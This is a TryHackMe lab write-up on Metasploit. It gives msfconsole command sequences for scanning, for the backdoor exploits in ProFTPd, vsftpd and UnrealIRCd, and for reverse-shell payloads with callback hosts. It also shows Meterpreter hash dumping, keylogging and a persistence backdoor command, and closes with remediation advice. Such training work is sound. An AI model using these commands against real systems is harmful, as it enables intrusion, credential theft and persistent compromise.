# Metasploit: Exploitation - TryHackMe Write-Up

## Challenge Information

**Name:** Metasploit: Exploitation
**Platform:** TryHackMe
**Difficulty:** Easy
**Date Completed:** December 2025
**Room URL:** https://tryhackme.com/room/metasploitexploitation

---

## Executive Summary

This room provides hands-on training with the Metasploit Framework, the industry-standard penetration testing platform. The exercises cover vulnerability scanning, exploit selection, payload configuration, session management, and post-exploitation techniques. Metasploit's power lies in its extensive exploit database, payload generators, and automated exploitation capabilities, making it an essential tool for both penetration testers and security analysts.

**Key Learning:** Mastering Metasploit Framework for vulnerability assessment and exploitation workflows.

---

## Metasploit Framework Overview

### What is Metasploit?

Metasploit is an open-source penetration testing framework that provides:
- Exploit database with 2000+ exploits
- Payload generators and encoders
- Post-exploitation modules
- Auxiliary modules for scanning and fuzzing
- Database integration for campaign tracking

**Architecture:**
- **Exploits:** Code that takes advantage of vulnerabilities
- **Payloads:** Code executed after successful exploitation
- **Auxiliary:** Scanners, fuzzers, denial-of-service tools
- **Post:** Post-exploitation modules
- **Encoders:** Obfuscate payloads to evade detection

---

## Methodology

### 1. Metasploit Basics

**Starting Metasploit:**
```bash
# Initialize Metasploit database
msfdb init

# Start Metasploit console
msfconsole

# Check database connection
msf6 > db_status
```

**Essential Commands:**
```bash
# Search for exploits
msf6 > search [keyword]

# Get information about a module
msf6 > info [module_path]

# Use a module
msf6 > use [module_path]

# Show module options
msf6 > show options

# Show available payloads
msf6 > show payloads

# Set options
msf6 > set [OPTION] [value]

# Run the exploit
msf6 > exploit
# or
msf6 > run
```

---

### 2. Vulnerability Scanning with Metasploit

**Port Scanning:**
```bash
# Using Metasploit's built-in scanner
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.X.X
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp) > run
```

**Service Version Detection:**
```bash
# SMB version scanning
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.X.X
msf6 auxiliary(scanner/smb/smb_version) > run

# HTTP version detection
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 10.10.X.X
msf6 auxiliary(scanner/http/http_version) > run
```

**Vulnerability Scanning:**
```bash
# Example: Scan for MS17-010 (EternalBlue)
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.10.X.X
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

---

### 3. Exploitation Workflow

**Step 1: Search for Exploits**
```bash
# Search by CVE
msf6 > search cve:2017 type:exploit platform:windows

# Search by service
msf6 > search vsftpd

# Search by application
msf6 > search apache
```

**Step 2: Select and Configure Exploit**
```bash
# Use the exploit
msf6 > use exploit/[path/to/exploit]

# Example: ProFTPd backdoor
msf6 > use exploit/unix/ftp/proftpd_133c_backdoor

# Show required options
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options

# Set target
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 10.10.X.X

# Show compatible payloads
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads
```

**Step 3: Select and Configure Payload**
```bash
# Set payload
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set PAYLOAD cmd/unix/reverse_netcat

# Set local host for callback
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 10.10.X.X

# Set local port
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LPORT 4444
```

**Step 4: Execute Exploit**
```bash
# Check if target is vulnerable
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > check

# Run the exploit
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
# or
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run
```

---

### 4. Common Payload Types

**Reverse Shells:**
```bash
# Linux reverse shell (Netcat)
set PAYLOAD cmd/unix/reverse_netcat

# Windows reverse shell (TCP)
set PAYLOAD windows/shell/reverse_tcp

# Meterpreter reverse shell (Windows)
set PAYLOAD windows/meterpreter/reverse_tcp

# Meterpreter reverse shell (Linux)
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

**Bind Shells:**
```bash
# Windows bind shell
set PAYLOAD windows/shell/bind_tcp

# Meterpreter bind shell
set PAYLOAD windows/meterpreter/bind_tcp
```

**Staged vs Non-Staged:**
- **Staged** (`windows/meterpreter/reverse_tcp`) - Small initial payload, downloads full payload
- **Non-Staged** (`windows/meterpreter_reverse_tcp`) - Complete payload sent at once

---

### 5. Meterpreter Post-Exploitation

**Meterpreter Basics:**
```bash
# Get system information
meterpreter > sysinfo

# Get user ID
meterpreter > getuid

# Get process ID
meterpreter > getpid

# List running processes
meterpreter > ps

# Get network configuration
meterpreter > ipconfig
meterpreter > ifconfig
```

**File System Operations:**
```bash
# Change directory
meterpreter > cd /path/to/directory

# List files
meterpreter > ls

# Download file from target
meterpreter > download /path/to/file /local/path

# Upload file to target
meterpreter > upload /local/file /remote/path

# Search for files
meterpreter > search -f filename.txt
```

**Privilege Escalation:**
```bash
# Check current privileges
meterpreter > getprivs

# Attempt automatic privilege escalation
meterpreter > getsystem

# Migrate to another process
meterpreter > migrate [PID]
```

**Credential Harvesting:**
```bash
# Dump password hashes (requires SYSTEM)
meterpreter > hashdump

# Dump tokens
meterpreter > use incognito
meterpreter > list_tokens -u

# Screenshot capture
meterpreter > screenshot

# Keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

**Persistence:**
```bash
# Create persistent backdoor
meterpreter > run persistence -X -i 60 -p 4444 -r 10.10.X.X
```

**Session Management:**
```bash
# Background current session
meterpreter > background

# List active sessions
msf6 > sessions -l

# Interact with session
msf6 > sessions -i [session_id]

# Kill session
msf6 > sessions -k [session_id]
```

---

### 6. Database Integration

**Using Metasploit Database:**
```bash
# Import Nmap scan
msf6 > db_import /path/to/nmap_scan.xml

# Show discovered hosts
msf6 > hosts

# Show discovered services
msf6 > services

# Show discovered vulnerabilities
msf6 > vulns

# Add manual note
msf6 > notes -a 10.10.X.X -t "custom note"

# Export data
msf6 > db_export /path/to/export.xml
```

**Workspace Management:**
```bash
# Create workspace
msf6 > workspace -a client_pentest

# List workspaces
msf6 > workspace

# Switch workspace
msf6 > workspace client_pentest

# Delete workspace
msf6 > workspace -d old_workspace
```

---

## Practical Exercises

### Exercise 1: Exploiting a Vulnerable FTP Service

```bash
# Search for FTP exploits
msf6 > search vsftpd

# Use backdoor exploit
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# Set target
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.X.X

# Exploit
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

### Exercise 2: Exploiting a Web Application

```bash
# Search for web exploits
msf6 > search unreal

# Use UnrealIRCd backdoor
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor

# Configure and exploit
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.10.X.X
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST tun0
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
```

---

## Flags Captured

**Flag 1:** [Exploitation success flag - add your captured flag]
**Flag 2:** [Meterpreter post-exploitation flag - add your captured flag]
**Flag 3:** [Final completion flag - add your captured flag]

---

## Tools & Techniques Used

- **Framework:** Metasploit Framework (msfconsole)
- **Scanning:** Metasploit auxiliary scanners
- **Exploitation:** Multiple exploit modules
- **Payloads:** Reverse shells, Meterpreter
- **Post-Exploitation:** File system navigation, credential harvesting, persistence
- **Database:** PostgreSQL integration for campaign tracking

---

## Key Learnings

**What I Learned:**

1. **Metasploit Workflow:** Complete exploitation workflow from reconnaissance to post-exploitation
2. **Exploit Selection:** Choosing appropriate exploits based on target system and service versions
3. **Payload Configuration:** Understanding staged vs non-staged payloads, reverse vs bind shells
4. **Meterpreter Mastery:** Advanced post-exploitation techniques with Meterpreter
5. **Session Management:** Managing multiple exploitation sessions simultaneously
6. **Database Integration:** Using PostgreSQL database for tracking targets and findings

**New Techniques:**
- Metasploit auxiliary modules for vulnerability scanning
- Payload encoding and obfuscation
- Meterpreter file system manipulation
- Hash dumping and credential harvesting
- Persistent backdoor creation
- Workspace organization for multiple engagements

**Best Practices:**
- Always use `check` command before exploitation
- Use database to track all findings
- Organize work with workspaces
- Background sessions rather than closing them
- Document all successful exploits in notes

---

## Remediation Recommendations

For systems vulnerable to Metasploit exploits:

1. **Patch Management:**
   - Implement regular patching schedule
   - Prioritize critical and high severity vulnerabilities
   - Test patches in staging before production deployment

2. **Service Hardening:**
   - Disable unnecessary services
   - Use latest stable versions of all software
   - Implement principle of least privilege

3. **Network Segmentation:**
   - Isolate critical systems
   - Implement DMZ for public-facing services
   - Use VLANs to separate network segments

4. **Detection & Prevention:**
   - Deploy IDS/IPS with Metasploit signatures
   - Implement endpoint detection and response (EDR)
   - Monitor for Meterpreter indicators of compromise

5. **Defense in Depth:**
   - Multi-layered security approach
   - Application whitelisting
   - Host-based firewalls

---

## References

- [Metasploit Framework Official Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed (Free Training)](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Metasploit Blog](https://blog.rapid7.com/tag/metasploit/)
- [TryHackMe Metasploit: Exploitation Room](https://tryhackme.com/room/metasploitexploitation)

---

## Metasploit Command Reference

**Quick Reference Card:**
```bash
# Essential Commands
search [keyword]              # Search for modules
use [module]                  # Select module
show options                  # Display module options
set [OPTION] [value]          # Set option value
setg [OPTION] [value]         # Set global option
exploit / run                 # Execute module
check                         # Check if target is vulnerable
back                          # Exit current module
sessions -l                   # List active sessions
sessions -i [id]              # Interact with session
db_nmap [options] [target]    # Run Nmap and import results
```

---

## Tags

`#metasploit` `#exploitation` `#meterpreter` `#penetration-testing` `#post-exploitation` `#payload` `#vulnerability-scanning` `#framework`

**Difficulty Rating (Personal):** 5/10 - Requires understanding of exploitation concepts and framework navigation

**Would Recommend:** Essential - Metasploit is industry standard for penetration testing

---

**Completion Date:** December 2025
**Framework Version:** Metasploit 6.x
**Key Skill Acquired:** Professional-grade exploitation framework proficiency
**Author:** Jax (Shlpwr3ck)

---

## Professional Application

Metasploit skills are directly applicable to:
- **Penetration Testing:** Primary tool for exploitation phase
- **Vulnerability Assessment:** Validating discovered vulnerabilities
- **Red Team Operations:** Post-exploitation and persistence
- **Security Research:** Testing exploits and developing custom modules
- **Incident Response:** Understanding attacker tools and techniques

This knowledge is foundational for **OSCP**, **CEH**, and **GPEN** certifications.
